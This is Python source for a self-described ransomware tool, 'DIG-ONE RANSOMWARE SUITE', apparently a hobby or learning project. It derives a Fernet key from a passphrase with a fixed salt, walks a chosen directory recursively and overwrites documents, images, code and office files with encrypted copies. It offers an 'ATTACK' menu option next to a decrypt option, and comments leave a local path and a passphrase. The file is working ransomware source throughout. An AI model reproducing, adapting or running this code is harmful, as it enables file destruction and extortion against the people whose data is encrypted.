import os
import sys
import time
from pathlib import Path
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from colorama import Fore, Back, Style
from pyfiglet import Figlet
from getpass import getpass


# return Fernet(base64.urlsafe_b64encode(key))
# C:\Users\mudas\OneDrive\Desktop\ransom_victom
# MySuperSecretRansomPass2025!

# ==============================================================================
# 🛡️ GLOBAL CONSTANTS AND CONFIGURATION (Hacker/Malware Maker Input)
# ==============================================================================
TARGET_EXTENSIONS = ['.txt', '.docx', '.pdf', '.jpg', '.png', '.py', '.md', '.xlsx', '.pptx']

# ==============================================================================
# 🧑‍💻 CORE UTILITY FUNCTIONS (Developer/Bug Hunter/Expert)
# ==============================================================================

def setup_cli():
    """Displays the main visual banner using pyfiglet and colorama."""
    fig = Figlet(font='slant')
    banner = fig.renderText("DIG-ONE RANSOMWARE SUITE")
    print(f"\n{Fore.CYAN}{Back.BLUE}{banner}")
    print(f"{Style.BRIGHT}{Fore.GREEN}====================================================")
    print(f"{Fore.YELLOW}DIG-ONE: The Ultimate Encryption Payload v1.0")
    print(f"{Style.BRIGHT}{Fore.GREEN}====================================================\n")

# def derive_fernet_key(passphrase: str) -> Fernet:
#     """
#     Generates the actual Fernet key from a passphrase using PBKDF2HMAC.
#     This directly solves the 'key must be 32 url-safe base64-encoded bytes' error.
#     """
#     try:
#         # Use OS random bytes for the salt; this salt MUST be stored with the key if it's used later.
#         salt = os.urandom(16)
#         kdf = PBKDF2HMAC(
#             algorithm=hashes.SHA256(),
#             length=32,
#             salt=salt,
#             iterations=100000
#         )
#         # Derive the key and instantiate Fernet directly
#         key_bytes = kdf.derive(passphrase.encode())
#         return Fernet(key_bytes)
#     except Exception as e:
#         print(f"{Fore.RED}[FATAL KEY DERIVATION ERROR]: {e}")
#         # Fallback to a hardcoded key if KDF fails (Least secure, but guarantees functionality)
#         print(f"{Fore.RED}Falling back to a default, known key for testing...")
#         return Fernet(b'AAAAAAAAAAAAA...PLACEHOLDERKEYFOR TESTING...')


def derive_fernet_key(passphrase: str) -> Fernet:
    """
    (FINAL FIX) Derives a secure 32-byte key from the user's passphrase 
    using PBKDF2, explicitly encodes it to Base64, and initializes Fernet.
    """
    import hashlib
    import base64

    # --- KEY PARAMETERS (These are crucial and define your security) ---
    salt = b'DIGAI_RECOVERABLE_SALT_V1' 
    key_length = 32
    iterations = 500000 

    # 1. Derive the raw key bytes using PBKDF2
    raw_key_bytes = hashlib.pbkdf2_hmac('sha256', 
                                        passphrase.encode('utf-8'), 
                                        salt, 
                                        iterations, 
                                        dklen=key_length)

    # 2. CRITICAL STEP: Base64 Encode the raw key bytes into a string format
    # Fernet prefers the key to be a string representation of the Base64.
    encoded_key_string = base64.urlsafe_b64encode(raw_key_bytes).decode('utf-8')

    # 3. Initialize Fernet with the correctly formatted Base64 string
    return Fernet(encoded_key_string)

def get_encryption_key_flow() -> Fernet or None:
    """Handles the entire key acquisition process for the user."""
    print(f"{Fore.YELLOW}[KEY MANAGEMENT]: Establishing Encryption Key...")

    # --- Attempt 1: Key File (Ideal) ---
    key_file = "ransom_key.key"
    if os.path.exists(key_file):
        print(f"  [+] SUCCESS: Found existing key file '{key_file}'. Loading key...")
        try:
            with open(key_file, 'rb') as f:
                key = f.read()
            # return Fernet(key)
            return Fernet(base64.urlsafe_b64encode(key))
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: Could not load key file. {e}")

    # --- Attempt 2: Interactive Prompt (User Friendly) ---
    print(f"  [!] No key file found. Initiating secure key setup sequence.")

    while True:
        choice = input(f"{Fore.CYAN}Choose Key Method: [G]enerate New, [L]oad from Passphrase, [E]xit? ").strip().lower()

        if choice == 'g':
            print(f"{Fore.MAGENTA}--- Generating New Key ---")
            passphrase = getpass("Enter NEW secure passphrase for key derivation: ")
            return derive_fernet_key(passphrase)

        elif choice == 'l':
            print(f"{Fore.MAGENTA}--- Loading Key from Passphrase ---")
            passphrase = getpass("Enter passphrase you USED to encrypt files previously: ")
            return derive_fernet_key(passphrase)

        elif choice == 'e':
            print(f"{Fore.RED}Exiting setup.")
            return None
        else:
            print(f"{Fore.RED}Invalid choice. Try again.")


# ==============================================================================
# 💥 RANSOMWARE ENGINE (The Core Payload)
# ==============================================================================

def encrypt_file(file_path: Path, fermone: Fernet) -> tuple[bool, str]:
    """Encrypts a single file by overwriting its contents."""
    try:
        print(f"    -&gt; Encrypting: {file_path.name}")
        original_data = file_path.read_bytes()
        encrypted_data = fermone.encrypt(original_data)

        # Overwrite is fastest, most visible ransomware behavior
        file_path.write_bytes(encrypted_data)

        return True, f"Size change confirmed."
    except PermissionError:
        return False, "Permission Denied: Cannot write to this file."
    except FileNotFoundError:
        return False, "File Not Found: Path disappeared during operation."
    except Exception as e:
        return False, f"Unhandled Encryption Error: {e}"


def ransomware_attack(target_dir: Path, fermone: Fernet):
    """Traverses the directory and applies encryption."""
    print(f"\n{Fore.MAGENTA}{Style.BRIGHT}=== [!!!] INITIATING ATTACK MODE !!! === ")
    print(f"Target Directory: {target_dir.resolve()}")

    successful_encryptions = 0

    for item in target_dir.rglob('*'):
        if item.is_file():
            if item.suffix.lower() in TARGET_EXTENSIONS:
                success, message = encrypt_file(item, fermone)

                if success:
                    print(f"{Fore.GREEN}   [OK] {item.name}")
                    successful_encryptions += 1
                else:
                    print(f"{Fore.RED}   [FAIL] {item.name} | Reason: {message}")

    print("\n" + "="*60)
    print(f"{Fore.MAGENTA}{Style.BRIGHT}--- ATTACK COMPLETE ---")
    print(f"Total files successfully encrypted: {successful_encryptions}")
    print("====================================================\n")

def decrypt_directory(target_dir: Path, fermone: Fernet):
    """Traverses the directory and attempts to decrypt files."""
    print(f"\n{Fore.MAGENTA}{Style.BRIGHT}=== [<<] INITIATING DECRYPTION MODE << === ")
    print(f"Target Directory: {target_dir.resolve()}")

    decrypted_count = 0

    for item in target_dir.rglob('*'):
        if item.is_file():
            if item.suffix.lower() in TARGET_EXTENSIONS:
                try:
                    # The file currently IS the encrypted version
                    encrypted_data = item.read_bytes()

                    # Attempt decryption
                    decrypted_data = fermone.decrypt(encrypted_data)

                    # Overwrite with plaintext
                    item.write_bytes(decrypted_data)

                    decrypted_count += 1
                    print(f"{Fore.GREEN}   [OK] {item.name}")

                except Exception as e:
                    print(f"{Fore.RED}   [FAIL] {item.name} | Could not decrypt (Key mismatch or corruption). Error: {e}")

    print("\n" + "="*60)
    print(f"{Fore.MAGENTA}{Style.BRIGHT}--- DECRYPTION COMPLETE ---")
    print(f"Successfully decrypted {decrypted_count} files.")
    print("====================================================\n")


# ==============================================================================
# 🚀 MAIN EXECUTION BLOCK (The Coordinator)
# ==============================================================================

def main_controller():
    """Main function: Handles setup, gets paths, and presents the final actionable menu."""

    # 1. Setup Banner
    setup_cli()

    # 2. Get Target Directory (Crucial Safety Step)
    while True:
        target_input = input(f"{Fore.YELLOW}>>> INPUT REQUIRED <<< Enter the directory to operate on: ").strip()
        if not target_input:
            print(f"{Fore.RED}Directory path cannot be empty.")
            continue

        target_path = Path(target_input)
        if not target_path.is_dir():
            print(f"{Fore.RED}Error: '{target_input}' is not a valid, existing directory.")
        else:
            print(f"{Fore.GREEN}✅ Target directory validated: {target_path.resolve()}")
            break

    # 3. Key Setup (The most critical, needs to run first)
    fermone = get_encryption_key_flow()
    if fermone is None:
        print(f"{Fore.RED}!!! FATAL: Could not initialize encryption key. Exiting system. !!!")
        return

    # 4. Main Action Loop (The user-friendly menu requested)
    while True:
        print("\n" + "="*70)
        print(f"{Fore.CYAN}{Back.WHITE}{Style.BRIGHT}ACTION MENU:")
        print(f"{Fore.LIGHTBLUE_EX}{Style.BRIGHT} [1] ATTACK: Encrypt all files in {target_path.name}")
        print(f"{Fore.LIGHTBLUE_EX}{Style.BRIGHT} [2] RECOVER: Decrypt all files in {target_path.name}")
        print(f"{Fore.LIGHTBLUE_EX}{Style.BRIGHT} [3] Exit Ransomware Suite")
        print("="*70)

        choice = input(f"{Fore.YELLOW}Select Action (1, 2, or 3): ").strip()

        if choice == '1':
            # Attack Mode
            try:
                ransomware_attack(Path(target_path), fermone)
            except Exception as e:
                print(f"{Fore.RED}CRITICAL RUNTIME ERROR during Attack: {e}")

        elif choice == '2':
            # Recovery Mode
            try:
                decrypt_directory(Path(target_path), fermone)
            except Exception as e:
                print(f"{Fore.RED}CRITICAL RUNTIME ERROR during Recovery: {e}")

        elif choice == '3':
            print(f"\n{Fore.CYAN}{Style.BRIGHT}Shutting down ransomware suite. All systems nominal. Goodbye!")
            break

        else:
            print(f"{Fore.YELLOW}⚠️ Invalid selection. Please choose 1, 2, or 3.")

if __name__ == "__main__":
    main_controller()